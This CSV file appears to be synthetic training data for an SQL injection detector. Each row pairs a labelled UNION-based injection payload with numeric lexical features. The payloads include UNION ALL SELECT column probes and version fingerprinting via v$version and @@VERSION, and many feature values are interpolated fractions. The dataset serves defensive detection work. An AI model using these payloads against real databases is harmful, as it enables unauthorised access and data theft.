id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000120,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,0.2894133096828185,69.22443119429074,24.73366467914361,4.199576830015097,27.0,22.579544955432596,11.0,8.644886238858149,0.3935212255603838,0.3219445852451633,0.16032346226534155,0.12421072692911125,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.6448862388581493,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,1.1550873071710492,100.81547739541921,26.0,4.050647988060799,63.63095479083843,4.592261302290392,24.0,8.592261302290392,0.6310329294674364,0.045602817965876785,0.23808122965783712,0.08528302290884962,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.5922613022903915,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5922613022903916,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000122,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,0.012801058249460918,75.90827605372834,23.0,4.003351747882369,27.0,27.92662084298267,11.0,9.981655210745668,0.35579735689157355,0.3677720997761625,0.14495447873360404,0.1314760645986599,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.981655210745667,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,1.0722874170265049,100.75702169398706,26.0,4.050554603949976,63.514043387974105,4.621489153006472,24.0,8.621489153006474,0.630242058212766,0.04591802027752079,0.23821877248473633,0.08562114902497685,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.621489153006474,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.6214891530064737,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000124,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,0.9301483862137866,75.23651711519588,31.473034230391768,4.366280395908508,45.053931539216464,2.2365171151958805,17.0,10.946068460783536,0.5989763294986358,0.029695745510403437,0.22596126474415262,0.14536666024680814,0.7095513455876523,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.2365171151958841,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000125,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000138,0.023831899225906197,109.94085405190759,27.98817081038152,4.139548912893759,36.90536648305215,40.047316758473926,16.976341620763037,16.01182918961848,0.3356518366420048,0.36429183388362146,0.1544071912901736,0.1456491381842001,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.0118291896184815,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.9881708103815188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.9881708103815185
SMOTE_000126,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,1.069981387116122,112.33951352495109,27.0,3.9772829860543277,64.0,6.0,30.78601803326811,11.553495491682972,0.5699754473244885,0.05343519818667081,0.27353523596436274,0.1030541185244781,2.330243237524458,0.0,2.0,0.0,1.0,3.0,0.0,0.4465045083170278,0.0,0.0,1.0,6.0,0.7767477458414861,0.0,1.0,0.0,0.0,1.0,0.2232522541585139,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000127,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000059,1.7774952780576772,69.45196499815538,27.72598249907769,4.143516767165392,26.451964998155383,20.72598249907769,15.419214000737847,6.854803500184461,0.37941826827313,0.2979501338563679,0.22346815838606476,0.09916343948443734,0.0,1.435589499446615,2.564410500553385,0.0,0.0,1.0,0.0,0.8548035001844617,0.0,0.0,1.0,3.564410500553385,0.0,1.0,0.8548035001844616,0.0,0.0,1.0,0.8548035001844617,0.0,0.0,0.0,0.0,1.0,1.0,0.8548035001844617,0.0,0.14519649981553837,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000128,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,0.060997049116910826,111.80361810313667,27.964294200570304,3.9762746725729134,65.92858840114062,4.01785289971485,31.875029701996066,9.982147100285152,0.5897244612907291,0.035960489069617796,0.2850324918072123,0.0892825578324408,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.9642942005703041,0.0,0.0,1.0,6.017852899714848,0.0,0.0,1.0,0.0,0.0,1.0,0.9821471002851521,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000129,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,0.33480625895395594,51.62702664451612,19.674594671096777,3.787779078786468,14.0,25.3016213156129,4.0,8.325405328903225,0.2717169552642816,0.489466336840821,0.07763341578979474,0.16118329210510263,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,4.325405328903225,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.43877634384503433,70.3766568921662,25.07533137843324,4.149529298180268,27.0,24.30132551373296,11.0,8.075331378433239,0.38560620798184875,0.3429852349844756,0.15709882547408655,0.11430973155958916,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.07533137843324,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.9194499131616573,71.82189412055284,22.382189412055283,3.840981946502618,14.0,28.586272944663413,16.471242351778862,12.764378824110569,0.1957943971176961,0.39444590900147886,0.23213619640856176,0.1776234974722633,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.6178105879447156,1.0,0.0,5.146568236165853,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000036,1.608882485629022,114.99276540536385,27.40144691892723,3.8907710311811656,64.80289383785446,5.197106162145541,34.992765405363855,10.0,0.563980585552937,0.045032419760290376,0.3039851367848831,0.0870018579018896,0.0,0.0,2.0,0.0,1.0,2.59855308107277,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.5985530810727704,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.598553081072771
SMOTE_000133,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000041,0.23791335133724964,49.60268475635504,21.10684565042367,3.8144309155715703,14.0,13.282147805084026,14.0,8.320536951271007,0.28424682983168964,0.2639916923173852,0.2842468298316897,0.16751464801923546,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,1.3205369512710066,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.40269172483846505,47.31131080803961,18.924524323215845,3.8184446966114907,14.0,21.84904864643169,4.0,7.4622621616079226,0.2967296216388646,0.46088043241272614,0.08477989189681846,0.15761005405159076,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.462262161607922,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,0.2849228994925963,108.58189180772456,27.832756723089823,4.001457957828333,62.334486553820355,3.9163783615449077,30.498270169269468,11.832756723089823,0.5743103160098356,0.036040726374161725,0.28072272427760325,0.10892623333839943,3.0,0.0,2.0,0.0,1.0,2.0,0.0,1.8327567230898225,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.9163783615449113,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000136,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.1582746273655179,69.74119192612646,21.874119192612646,3.8422550999106186,14.0,38.992953540901176,4.0,12.748238385225292,0.20125220804299918,0.558497350348401,0.05750063086942836,0.18274981073917151,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.748238385225292,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,0.3258012732834607,55.27365728097399,21.484910485398267,3.821204803736673,14.0,17.818925824779193,14.0,9.454731456194798,0.2579923274028982,0.3135001826116777,0.2579923274028982,0.17051516258252591,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,2.4547314561947986,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,0.345961512518113,76.80836792979616,25.84041839648981,4.169211364908299,27.0,29.446694343836935,11.0,9.361673585959235,0.35545293039489656,0.3787224528653078,0.14481415682755044,0.12101045991224521,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,5.361673585959234,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.18626054747081178,94.56244807766355,25.94249792310654,4.090506242161331,27.0,42.84995846213083,11.0,13.712489615532707,0.286944527861368,0.4514155365239677,0.1169033261657425,0.14473660944892172,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,8.712489615532707,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.11078666033168635,84.43205635863093,28.943205635863094,4.290743933875086,36.54564508690475,20.0,16.886411271726185,11.0,0.4325323524890289,0.23707590161998138,0.2,0.13039174589098979,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.9432056358630934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.943205635863094
SMOTE_000141,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,0.32054539673946436,57.48327156107901,20.2483271561079,3.9251066337280567,14.0,29.986617248863205,4.0,9.496654312215801,0.24482075472584447,0.520204851741892,0.069948787064527,0.1650256064677365,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.4966543122158,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,union,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",nearest_attack_euclidean,R000073,0.500616174882358,109.43897205285222,27.43897205285222,3.852388909512423,25.0,49.122055894295556,20.31691615855666,15.0,0.22845334163962075,0.44901982237673443,0.18545483099987237,0.13707200498377245,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.7194860264261096,0.0,0.0,8.280513973573889,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.737196114623863,83.85344243487731,22.0,3.641906849075874,14.0,39.8534424348773,14.829311513024539,15.170688486975461,0.16879207986492606,0.4695106061388037,0.1809878374094046,0.1807094765868656,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.2073278782561347,1.0,0.0,7.963360608719326,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.00031954520916186997,98.99894176391487,29.000162805551557,4.189810553386454,36.99934877779377,32.0,16.999837194448443,12.999755791672662,0.373734400250967,0.32323630062893166,0.1717173916213111,0.13131190749879026,2.9998371944484417,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,3.999918597224221,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999185972242209,2.0,1.0,1.0,0.9999185972242208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.999918597224221
SMOTE_000145,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.10174354992572922,70.61069000121427,21.844276000485706,3.815852916907141,14.0,39.68855200097141,4.0,12.922138000242853,0.19834620998356814,0.5619845480197183,0.0566703457095909,0.18299889628712274,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.922138000242853,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000146,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000148,0.17714729693413145,41.904102880354145,21.879452949286115,4.211031638440233,14.0,16.723282304283316,4.0,7.180820576070829,0.3359505921929625,0.39685928936844495,0.09598588348370359,0.17120423495488893,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,2.180820576070829,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000147,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,0.8008521468196653,100.76702337438091,26.255674458126972,4.103880388917129,62.744325541873025,4.255674458126972,23.255674458126972,10.511348916253942,0.6228262215146898,0.042184403137395465,0.23076950565067342,0.10421986969724129,3.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.511348916253942,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.2556744581269711,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000148,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.38725108285029536,101.41572115243319,26.0,4.039028935242301,63.66288460973277,4.584278847566807,24.584278847566807,8.584278847566807,0.6276622630685451,0.04522748571559715,0.24244021886948336,0.08467003234637438,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.584278847566807,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000149,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.8755098910169967,110.40560166297965,28.062932224680235,4.082710551506639,29.0,49.87413555063953,15.0,16.53146611234012,0.2627160510954776,0.451573713564604,0.13588761263559185,0.14982262270432659,2.0629322246802357,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.46853388765988,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000150,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.23345369303479238,101.30091745245342,29.0,4.014029174297532,29.0,42.64073396196273,15.0,14.660183490490683,0.28643485178114236,0.4207207479863494,0.14815595781783225,0.14468844241467596,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.660183490490683,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000055,0.04503752045101809,104.6827074981904,26.0,3.7884368641817505,25.0,43.746165998552314,22.0,13.936541499638079,0.23889045739801903,0.4177752681631695,0.2102236025102568,0.13311067192855466,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.9365414996380785,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
